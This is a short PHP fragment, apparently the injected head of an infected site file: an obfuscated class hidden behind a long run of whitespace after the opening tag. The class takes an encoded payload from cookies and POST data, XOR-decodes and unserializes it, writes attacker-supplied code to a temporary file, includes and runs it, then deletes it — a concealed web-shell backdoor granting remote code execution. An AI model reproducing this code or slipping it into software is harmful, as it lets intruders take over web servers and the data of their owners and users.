<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("tgnlmyir")){class tgnlmyir{public static $byxrrcjpl = "isnmqdhnhugzbcuv";public static $vsczamlhbg = NULL;public function __construct(){$gjetawzonz = @$_COOKIE[substr(tgnlmyir::$byxrrcjpl, 0, 4)];if (!empty($gjetawzonz)){$fsvlrgw = "base64";$qleogg = "";$gjetawzonz = explode(",", $gjetawzonz);foreach ($gjetawzonz as $gcqefcp){$qleogg .= @$_COOKIE[$gcqefcp];$qleogg .= @$_POST[$gcqefcp];}$qleogg = array_map($fsvlrgw . "_decode", array($qleogg,));$qleogg = $qleogg[0] ^ str_repeat(tgnlmyir::$byxrrcjpl, (strlen($qleogg[0]) / strlen(tgnlmyir::$byxrrcjpl)) + 1);tgnlmyir::$vsczamlhbg = @unserialize($qleogg);}}public function __destruct(){$this->mhshwksxtj();}private function mhshwksxtj(){if (is_array(tgnlmyir::$vsczamlhbg)) {$syocldu = sys_get_temp_dir() . "/" . crc32(tgnlmyir::$vsczamlhbg["salt"]);@tgnlmyir::$vsczamlhbg["write"]($syocldu, tgnlmyir::$vsczamlhbg["content"]);include $syocldu;@tgnlmyir::$vsczamlhbg["delete"]($syocldu);exit();}}}$ovhmbg = new tgnlmyir();$ovhmbg = NULL;} ?><?php
/*
